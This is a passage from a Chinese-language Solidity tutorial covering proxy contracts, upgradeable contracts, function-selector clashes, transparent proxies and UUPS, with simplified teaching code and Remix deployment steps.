title="逻辑合约Logic"></a>逻辑合约<code>Logic</code></h3><p>这是一个非常简单的逻辑合约，只是为了演示代理合约。它包含<code>2</code>个变量，<code>1</code>个事件，<code>1</code>个函数：</p><ul><li><code>implementation</code>：占位变量，与<code>Proxy</code>合约保持一致，防止插槽冲突。</li><li><code>x</code>：<code>uint</code>变量，被设置为<code>99</code>。</li><li><code>CallSuccess</code>事件：在调用成功时释放。</li><li><code>increment()</code>函数：会被<code>Proxy</code>合约调用，释放<code>CallSuccess</code>事件，并返回一个<code>uint</code>，它的<code>selector</code>为<code>0xd09de08a</code>。如果直接调用<code>increment()</code>会返回<code>100</code>，但是通过<code>Proxy</code>调用它会返回<code>1</code>，大家可以想想为什么？</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @dev 逻辑合约，执行被委托的调用</span><br><span class="hljs-comment"> */</span><br>contract Logic &#123;<br>    address <span class="hljs-keyword">public</span> implementation; <span class="hljs-comment">// 与Proxy保持一致，防止插槽冲突</span><br>    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> x = <span class="hljs-number">99</span>; <br>    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">CallSuccess</span>()</span>; <span class="hljs-comment">// 调用成功事件</span><br><br>    <span class="hljs-comment">// 这个函数会释放CallSuccess事件并返回一个uint。</span><br>    <span class="hljs-comment">// 函数selector: 0xd09de08a</span><br>    <span class="hljs-function">function <span class="hljs-title">increment</span>() external <span class="hljs-title">returns</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span></span>)</span> &#123;<br>        <span class="hljs-function">emit <span class="hljs-title">CallSuccess</span>()</span>;<br>        <span class="hljs-keyword">return</span> x + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调用者合约Caller"><a href="#调用者合约Caller" class="headerlink" title="调用者合约Caller"></a>调用者合约<code>Caller</code></h3><p><code>Caller</code>合约会演示如何调用一个代理合约，它也非常简单。但是要理解它，你需要先学习本教程的<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/22_Call/readme.md">第22讲 Call</a>和<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/27_ABIEncode/readme.md">第27讲 ABI编码</a>。</p><p>它有<code>1</code>个变量，<code>2</code>个函数：</p><ul><li><code>proxy</code>：状态变量，记录代理合约地址。</li><li>构造函数：在部署合约时初始化<code>proxy</code>变量。</li><li><code>increase()</code>：利用<code>call</code>来调用代理合约的<code>increment()</code>函数，并返回一个<code>uint</code>。在调用时，我们利用<code>abi.encodeWithSignature()</code>获取了<code>increment()</code>函数的<code>selector</code>。在返回时，利用<code>abi.decode()</code>将返回值解码为<code>uint</code>类型。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Caller合约，调用代理合约，并获取执行结果<br> */<br>contract Caller&#123;<br>    address public proxy; // 代理合约地址<br><br>    constructor(address proxy_)&#123;<br>        proxy = proxy_;<br>    &#125;<br><br>    // 通过代理合约调用increment()函数<br>    function increment() external returns(uint) &#123;<br>        ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;));<br>        return abi.decode(data,(uint));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.21;<br><br>contract Proxy &#123;<br>    // 逻辑合约地址。implementation合约同一个位置的状态变量类型必须和Proxy合约的相同，不然会报错。<br>    address public implementation;<br>    // 代理合约在部署的时候要传入逻辑合约来指定允许的地方<br>    constructor(address implementation_)&#123;<br>        implementation = implementation_;<br>    &#125;<br>    /**<br>    * @dev 回调函数，将本合约的调用委托给 `implementation` 合约<br>    * 通过assembly，让回调函数也能有返回值<br>    */<br>    fallback() external payable &#123;<br>        address _implementation = implementation;<br>        assembly &#123;<br>        // 将msg.data拷贝到内存里<br>        // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度<br>            calldatacopy(0, 0, calldatasize())<br><br>        // 利用delegatecall调用implementation合约<br>        // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度<br>        // output area起始位置和长度位置，所以设为0<br>        // delegatecall成功返回1，失败返回0<br>            let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)<br><br>        // 将return data拷贝到内存<br>        // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度<br>            returndatacopy(0, 0, returndatasize())<br><br>            switch result<br>            // 如果delegate call失败，revert<br>            case 0 &#123;<br>                revert(0, returndatasize())<br>            &#125;<br>            // 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes）<br>            default &#123;<br>                return(0, returndatasize())<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>contract Logic&#123;<br>    address public implementation; // 与Proxy保持一致，防止插槽冲突<br>    uint public x = 99;<br>    event CallSuccess(); // 调用成功事件<br>    // 这个函数会释放CallSuccess事件并返回一个uint。<br>    // 函数selector: 0xd09de08a<br>    function increment() external returns(uint) &#123;<br>        emit CallSuccess();<br>        return x + 1;<br>    &#125;<br>&#125;<br><br>contract Caller&#123;<br>    // 调用合约在构造的时候要指定对应的代理合约，<br>    address public proxy; // 代理合约地址<br>    constructor(address proxy_)&#123;<br>        proxy=proxy_;<br>    &#125;<br>    // 通过代理合约调用increment()函数<br>    function increment() external returns(uint) &#123;<br>        (,bytes memory data)=proxy.call(abi.encodeWithSignature(&quot;increment()&quot;));// 去拿data<br>        return abi.decode(data,(uint));//把data 解码成uint 的格式返回出去<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="47-可升级合约"><a href="#47-可升级合约" class="headerlink" title="47. 可升级合约"></a>47. 可升级合约</h1><h2 id="可升级合约"><a href="#可升级合约" class="headerlink" title="可升级合约"></a>可升级合约</h2><p>如果你理解了代理合约，就很容易理解可升级合约。它就是一个可以更改逻辑合约的代理合约。–<em>其实就是改变代理合约里面调用的逻辑合约的合约地址</em></p><p><img src="/img/web3/47-1.png" alt="47-1"></p><p>下面我们实现一个简单的可升级合约，它包含<code>3</code>个合约：代理合约，旧的逻辑合约，和新的逻辑合约。</p><h3 id="代理合约-1"><a href="#代理合约-1" class="headerlink" title="代理合约"></a>代理合约</h3><p>这个代理合约比<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/46_ProxyContract/readme.md">第46讲</a>中的简单。我们没有在它的<code>fallback()</code>函数中使用<code>内联汇编</code>，而仅仅用了<code>implementation.delegatecall(msg.data);</code>。因此，回调函数没有返回值，但足够教学使用了。</p><p>它包含<code>3</code>个变量：</p><ul><li><code>implementation</code>：逻辑合约地址。</li><li><code>admin</code>：admin地址。</li><li><code>words</code>：字符串，可以通过逻辑合约的函数改变。</li></ul><p>它包含<code>3</code>个函数：</p><ul><li>构造函数：初始化admin和逻辑合约地址。</li><li><code>fallback()</code>：回调函数，将调用委托给逻辑合约。</li><li><code>upgrade()</code>：升级函数，改变逻辑合约地址，只能由<code>admin</code>调用。</li></ul><h3 id="旧逻辑合约"><a href="#旧逻辑合约" class="headerlink" title="旧逻辑合约"></a>旧逻辑合约</h3><p>这个逻辑合约包含<code>3</code>个状态变量，与代理合约保持一致，防止插槽冲突。它只有一个函数<code>foo()</code>，将代理合约中的<code>words</code>的值改为<code>&quot;old&quot;</code>。</p><h3 id="新逻辑合约"><a href="#新逻辑合约" class="headerlink" title="新逻辑合约"></a>新逻辑合约</h3><p>这个逻辑合约包含<code>3</code>个状态变量，与代理合约保持一致，防止插槽冲突。它只有一个函数<code>foo()</code>，将代理合约中的<code>words</code>的值改为<code>&quot;new&quot;</code>。</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.21;<br><br>// 代理合约<br>contract UpgradeProxy&#123;<br>    //它包含`3`个变量：<br>    //<br>    //- `implementation`：逻辑合约地址。<br>    address public implementation;<br>    //- `admin`：admin地址。<br>    address public admin;<br><br>    //- `words`：字符串，可以通过逻辑合约的函数改变。<br>    string public words;<br>    //<br>    //它包含`3`个函数：<br>    //<br>    //- 构造函数：初始化admin和逻辑合约地址。<br>    constructor(address implementation_)&#123;<br>        implementation=implementation_;<br>        admin=msg.sender;<br>    &#125;<br>    //- `fallback()`：回调函数，将调用委托给逻辑合约。<br>    fallback() external payable &#123;<br>        (bool success,bytes memory data)=implementation.delegatecall(msg.data);<br>    &#125;<br>    //- `upgrade()`：升级函数，改变逻辑合约地址，只能由`admin`调用。<br>    function upgrade(address newImplementation) external &#123;<br>        require(msg.sender==admin,&quot;Sorry you are not admin&quot;);<br>        implementation=newImplementation;<br>    &#125;<br><br><br>&#125;<br><br><br>//### 旧逻辑合约<br>//<br>//<br>//<br>contract Logic1&#123;<br>    //这个逻辑合约包含`3`个状态变量，与代理合约保持一致，防止插槽冲突。它只有一个函数`foo()`，将代理合约中的`words`的值改为`&quot;old&quot;`。<br><br>    //- `implementation`：逻辑合约地址。<br>    address public implementation;<br>    //- `admin`：admin地址。<br>    address public admin;<br><br>    //- `words`：字符串，可以通过逻辑合约的函数改变。<br>    string public words;<br>    // 改变proxy中状态变量，选择器： 0xc2985578<br>    function foo() public &#123;<br>        words=&#x27;old&#x27;;<br><br>    &#125;<br>&#125;<br><br>//### 新逻辑合约<br>//<br>//<br>//<br>// 逻辑合约2<br>contract Logic2 &#123;<br>    // 状态变量和proxy合约一致，防止插槽冲突<br>    address public implementation;<br>    address public admin;<br>    string public words; // 字符串，可以通过逻辑合约的函数改变<br><br>    // 改变proxy中状态变量，选择器：0xc2985578<br>    function foo() public&#123;<br>        words = &quot;new&quot;;<br>    &#125;<br>&#125;<br>//这个逻辑合约包含`3`个状态变量，与代理合约保持一致，防止插槽冲突。它只有一个函数`foo()`，将代理合约中的`words`的值改为`&quot;new&quot;`。<br></code></pre></td></tr></table></figure><h1 id="48-透明代理"><a href="#48-透明代理" class="headerlink" title="48. 透明代理"></a>48. 透明代理</h1><h2 id="选择器冲突"><a href="#选择器冲突" class="headerlink" title="选择器冲突"></a>选择器冲突</h2><p>智能合约中，函数选择器（selector）是函数签名的哈希的前4个字节。例如<code>mint(address account)</code>的选择器为<code>bytes4(keccak256(&quot;mint(address)&quot;))</code>，也就是<code>0x6a627842</code>。更多关于选择器的内容见<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/29_Selector/readme.md">WTF Solidity极简教程第29讲：函数选择器</a></p><p>由于函数选择器仅有4个字节，范围很小，因此两个不同的函数可能会有相同的选择器，例如下面两个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 选择器冲突的例子<br>contract Foo &#123;<br>    function burn(uint256) external &#123;&#125;<br>    function collate_propagate_storage(bytes16) external &#123;&#125;<br>&#125;<br>// 他俩的选择器是一样的<br></code></pre></td></tr></table></figure><p>示例中，函数<code>burn()</code>和<code>collate_propagate_storage()</code>的选择器都为<code>0x42966c68</code>，是一样的，这种情况被称为“选择器冲突”。在这种情况下，<code>EVM</code>无法通过函数选择器分辨用户调用哪个函数，因此该合约无法通过编译。</p><p>由于代理合约和逻辑合约是两个合约，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。举个例子，如果逻辑合约的<code>a</code>函数和代理合约的升级函数的选择器相同，那么管理人就会在调用<code>a</code>函数的时候，将代理合约升级成一个黑洞合约，后果不堪设想。</p><p>目前，有两个可升级合约标准解决了这一问题：透明代理<code>Transparent Proxy</code>和通用可升级代理<code>UUPS</code>。</p><h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>透明代理的逻辑非常简单：管理员可能会因为“函数选择器冲突”，在调用逻辑合约的函数时，误调用代理合约的可升级函数。那么限制管理员的权限，不让他调用任何逻辑合约的函数，就能解决冲突：</p><ul><li>管理员变为工具人，仅能调用代理合约的可升级函数对合约升级，不能通过回调函数调用逻辑合约。</li><li>其它用户不能调用可升级函数，但是可以调用逻辑合约的函数。</li></ul><h3 id="代理合约-2"><a href="#代理合约-2" class="headerlink" title="代理合约"></a>代理合约</h3><p>这里的代理合约和<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/47_Upgrade/readme.md">第47讲</a>的非常相近，只是<code>fallback()</code>函数限制了管理员地址的调用。</p><p>它包含<code>3</code>个变量：</p><ul><li><code>implementation</code>：逻辑合约地址。</li><li><code>admin</code>：admin地址。</li><li><code>words</code>：字符串，可以通过逻辑合约的函数改变。</li></ul><p>它包含<code>3</code>个函数</p><ul><li>构造函数：初始化admin和逻辑合约地址。</li><li><code>fallback()</code>：回调函数，将调用委托给逻辑合约，不能由<code>admin</code>调用。</li><li><code>upgrade()</code>：升级函数，改变逻辑合约地址，只能由<code>admin</code>调用。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 透明可升级合约的教学代码，不要用于生产。<br>contract TransparentProxy &#123;<br>    address implementation; // logic合约地址<br>    address admin; // 管理员<br>    string public words; // 字符串，可以通过逻辑合约的函数改变<br><br>    // 构造函数，初始化admin和逻辑合约地址<br>    constructor(address _implementation)&#123;<br>        admin = msg.sender;<br>        implementation = _implementation;<br>    &#125;<br><br>    // fallback函数，将调用委托给逻辑合约<br>    // 不能被admin调用，避免选择器冲突引发意外<br>    fallback() external payable &#123;<br>        require(msg.sender != admin);<br>        (bool success, bytes memory data) = implementation.delegatecall(msg.data);<br>    &#125;<br><br>    // 升级函数，改变逻辑合约地址，只能由admin调用<br>    function upgrade(address newImplementation) external &#123;<br>        if (msg.sender != admin) revert();<br>        implementation = newImplementation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="逻辑合约"><a href="#逻辑合约" class="headerlink" title="逻辑合约"></a>逻辑合约</h3><p>这里的新、旧逻辑合约与<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/47_Upgrade/readme.md">第47讲</a>一样。逻辑合约包含<code>3</code>个状态变量，与代理合约保持一致，防止插槽冲突；包含一个函数<code>foo()</code>，旧逻辑合约会将<code>words</code>的值改为<code>&quot;old&quot;</code>，新的会改为<code>&quot;new&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 旧逻辑合约<br>contract Logic1 &#123;<br>    // 状态变量和proxy合约一致，防止插槽冲突<br>    address public implementation; <br>    address public admin; <br>    string public words; // 字符串，可以通过逻辑合约的函数改变<br><br>    // 改变proxy中状态变量，选择器： 0xc2985578<br>    function foo() public&#123;<br>        words = &quot;old&quot;;<br>    &#125;<br>&#125;<br><br>// 新逻辑合约<br>contract Logic2 &#123;<br>    // 状态变量和proxy合约一致，防止插槽冲突<br>    address public implementation; <br>    address public admin; <br>    string public words; // 字符串，可以通过逻辑合约的函数改变<br><br>    // 改变proxy中状态变量，选择器：0xc2985578<br>    function foo() public&#123;<br>        words = &quot;new&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="透明代理的目的"><a href="#透明代理的目的" class="headerlink" title="透明代理的目的"></a>透明代理的目的</h3><p>通过区分管理员和普通用户的调用路径，避免管理员调用逻辑合约的函数，只允许管理员调用代理合约自己的管理方法（如升级函数）。</p><blockquote><p>[!IMPORTANT]</p><p>为了避免代理合约的升级合约函数的选择器和逻辑合约里面某个函数的选择器一样发生冲突</p><p>所以在代理合约里面，只有升级合约函数可以又管理员调用，其他函数一律不可，包括回调函数特别是回调函数</p></blockquote><h1 id="49-通用可升级代理"><a href="#49-通用可升级代理" class="headerlink" title="49. 通用可升级代理"></a>49. 通用可升级代理</h1><p>这一讲，我们将介绍代理合约中选择器冲突（Selector Clash）的另一个解决办法：通用可升级代理（UUPS，universal upgradeable proxy standard）。教学代码由<code>OpenZeppelin</code>的<code>UUPSUpgradeable</code>简化而成，不应用于生产。</p><h2 id="UUPS"><a href="#UUPS" class="headerlink" title="UUPS"></a>UUPS</h2><p>我们在<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/48_TransparentProxy/readme.md">上一讲</a>已经学习了”选择器冲突”（Selector Clash），即合约存在两个选择器相同的函数，可能会造成严重后果。作为透明代理的替代方案，UUPS也能解决这一问题。</p><p>UUPS（universal upgradeable proxy standard，通用可升级代理）将升级函数放在逻辑合约中。这样一来，如果有其它函数与升级函数存在“选择器冲突”，编译时就会报错。</p><p>下表中概括了普通可升级合约，透明代理，和UUPS的不同点：</p><p><img src="/img/web3/49-1.png" alt="49-1"></p><h2 id="UUPS合约"><a href="#UUPS合约" class="headerlink" title="UUPS合约"></a>UUPS合约</h2><p>首先我们要复习一下<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/23_Delegatecall/readme.md">WTF Solidity极简教程第23讲：Delegatecall</a>。如果用户A通过合约B（代理合约）去<code>delegatecall</code>合约C（逻辑合约），上下文仍是合约B的上下文，<code>msg.sender</code>仍是用户A而不是合约B。因此，UUPS合约可以将升级函数放在逻辑合约中，并检查调用者是否为管理员。</p><p><img src="/img/web3/49-2.png" alt="49-2"></p><h3 id="UUPS的代理合约"><a href="#UUPS的代理合约" class="headerlink" title="UUPS的代理合约"></a>UUPS的代理合约</h3><p>UUPS的代理合约看起来像是个不可升级的代理合约，非常简单，因为升级函数被放在了逻辑合约中。它包含<code>3</code>个变量：</p><ul><li><code>implementation</code>：逻辑合约地址。</li><li><code>admin</code>：admin地址。</li><li><code>words</code>：字符串，可以通过逻辑合约的函数改变。</li></ul><p>它包含<code>2</code>个函数</p><ul><li>构造函数：初始化admin和逻辑合约地址。</li><li><code>fallback()</code>：回调函数，将调用委托给逻辑合约。</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">contract UUPSProxy &#123;<br>    address <span class="hljs-keyword">public</span> implementation; <span class="hljs-comment">// 逻辑合约地址</span><br>    address <span class="hljs-keyword">public</span> admin; <span class="hljs-comment">// admin地址</span><br>    string <span class="hljs-keyword">public</span> words; <span class="hljs-comment">// 字符串，可以通过逻辑合约的函数改变</span><br><br>    <span class="hljs-comment">// 构造函数，初始化admin和逻辑合约地址</span><br>    <span class="hljs-keyword">constructor</span>(address _implementation)&#123;<br>        admin = msg.sender;<br>        implementation = _implementation;<br>    &#125;<br><br>    <span class="hljs-comment">// fallback函数，将调用委托给逻辑合约</span><br>    fallback() <span class="hljs-keyword">external</span> payable &#123;<br>        (bool success, bytes memory <span class="hljs-keyword">data</span>) = implementation.delegatecall(msg.<span class="hljs-keyword">data</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="UUPS的逻辑合约"><a href="#UUPS的逻辑合约" class="headerlink" title="UUPS的逻辑合约"></a>UUPS的逻辑合约</h3><p>UUPS的逻辑合约与<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/47_Upgrade/readme.md">第47讲</a>中的不同是多了个升级函数。UUPS逻辑合约包含<code>3</code>个状态变量，与代理合约保持一致，防止插槽冲突。它包含<code>2</code>个</p><ul><li><code>upgrade()</code>：升级函数，将改变逻辑合约地址<code>implementation</code>，只能由<code>admin</code>调用。</li><li><code>foo()</code>：旧UUPS逻辑合约会将<code>words</code>的值改为<code>&quot;old&quot;</code>，新的会改为<code>&quot;new&quot;</code>。</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">// UUPS逻辑合约（升级函数写在逻辑合约内）</span><br>contract UUPS1&#123;<br>    <span class="hljs-comment">// 状态变量和proxy合约一致，防止插槽冲突</span><br>    address <span class="hljs-keyword">public</span> implementation; <br>    address <span class="hljs-keyword">public</span> admin; <br>    string <span class="hljs-keyword">public</span> words; <span class="hljs-comment">// 字符串，可以通过逻辑合约的函数改变</span><br><br>    <span class="hljs-comment">// 改变proxy中状态变量，选择器： 0xc2985578</span><br>    <span class="hljs-title function_"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span></span>() <span class="hljs-keyword">public</span>&#123;<br>        words = <span class="hljs-string">&quot;old&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010</span><br>    <span class="hljs-comment">// UUPS中，逻辑合约中必须包含升级函数，不然就不能再升级了。</span><br>    <span class="hljs-title function_"><span class="hljs-keyword">function</span> <span class="hljs-title">upgrade</span></span>(address <span class="hljs-keyword">new</span><span class="hljs-type">Implementation</span>) external &#123;<br>        require(msg.sender == admin);<br>        implementation = <span class="hljs-keyword">new</span><span class="hljs-type">Implementation</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 新的UUPS逻辑合约</span><br>contract UUPS2&#123;<br>    <span class="hljs-comment">// 状态变量和proxy合约一致，防止插槽冲突</span><br>    address <span class="hljs-keyword">public</span> implementation; <br>    address <span class="hljs-keyword">public</span> admin; <br>    string <span class="hljs-keyword">public</span> words; <span class="hljs-comment">// 字符串，可以通过逻辑合约的函数改变</span><br><br>    <span class="hljs-comment">// 改变proxy中状态变量，选择器： 0xc2985578</span><br>    <span class="hljs-title function_"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span></span>() <span class="hljs-keyword">public</span>&#123;<br>        words = <span class="hljs-string">&quot;new&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010</span><br>    <span class="hljs-comment">// UUPS中，逻辑合约中必须包含升级函数，不然就不能再升级了。</span><br>    <span class="hljs-title function_"><span class="hljs-keyword">function</span> <span class="hljs-title">upgrade</span></span>(address <span class="hljs-keyword">new</span><span class="hljs-type">Implementation</span>) external &#123;<br>        require(msg.sender == admin);<br>        implementation = <span class="hljs-keyword">new</span><span class="hljs-type">Implementation</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Remix实现"><a href="#Remix实现" class="headerlink" title="Remix实现"></a><code>Remix</code>实现</h2><ol><li>部署UUPS新旧逻辑合约<code>UUPS1</code>和<code>UUPS2</code>。</li></ol><p><img src="/img/web3/49-3.jpg" alt="49-3"></p><ol start="2"><li>部署UUPS代理合约<code>UUPSProxy</code>，将<code>implementation</code>地址指向旧逻辑合约<code>UUPS1</code>。</li></ol><p><img src="/img/web3/49-4.jpg" alt="49-4"></p><ol start="3"><li>利用选择器<code>0xc2985578</code>，在代理合约中调用旧逻辑合约<code>UUPS1</code>的<code>foo()</code>函数，将<code>words</code>的值改为<code>&quot;old&quot;</code>。</li></ol><p><img src="/img/web3/49-5.jpg" alt="49-5"></p><ol start="4"><li>利用在线ABI编码器<a href="https://abi.hashex.org/">HashEx</a>获得二进制编码，调用升级函数<code>upgrade()</code>，将<code>implementation</code>地址指向新逻辑合约<code>UUPS2</code>。</li></ol><p><img src="/img/web3/49-31.png" alt="49-3"></p><p><img src="/img/web3/49-6.jpg" alt="49-6"></p><ol 